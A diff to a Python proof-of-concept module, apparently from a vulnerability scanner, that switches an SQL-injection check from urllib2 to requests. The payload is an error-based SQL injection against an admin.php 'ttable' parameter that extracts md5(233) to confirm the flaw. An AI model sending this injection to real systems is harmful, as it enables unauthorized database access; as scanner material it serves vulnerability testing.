@@ -38,15 +38,14 @@ class Poc(ABPoc):
             header = {
                 'cookie': 'cookie'
             }
-            payload = ("/admin.php?adminjob=apps&admintype=groups_manage&action=argument&keyword=1"
-                       "&ttable=/**/tm ON t.tid=tm.tid LEFT JOIN pw_argument a ON t.tid="
-                       "a.tid LEFT JOIN pw_colonys c ON a.cyid=c.id WHERE (SELECT 1 FROM (select count(*),concat"
+            payload = ("/admin.php?adminjob=apps&admintype=groups_manage&action=argument&keyword=1"+
+                       "&ttable=/**/tm ON t.tid=tm.tid LEFT JOIN pw_argument a ON t.tid="+
+                       "a.tid LEFT JOIN pw_colonys c ON a.cyid=c.id WHERE (SELECT 1 FROM (select count(*),concat"+
                        "(floor(rand(0)*2),CONCAT(0x3a,(SELECT md5(233))))a from information_schema.tables group by a)b)%23")
             verify_url = self.target + payload
-            req = urllib2.Request(verify_url, headers=header)
-            content = urllib2.urlopen(req).read()
+            req = requests.get(verify_url,headers=header)
 
-            if 'e165421110ba03099a1c0393373c5b43' in content:
+            if 'e165421110ba03099a1c0393373c5b43' in req.text:
                 #args['success'] = True
                 #args['poc_ret']['vul_url'] = verify_url
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
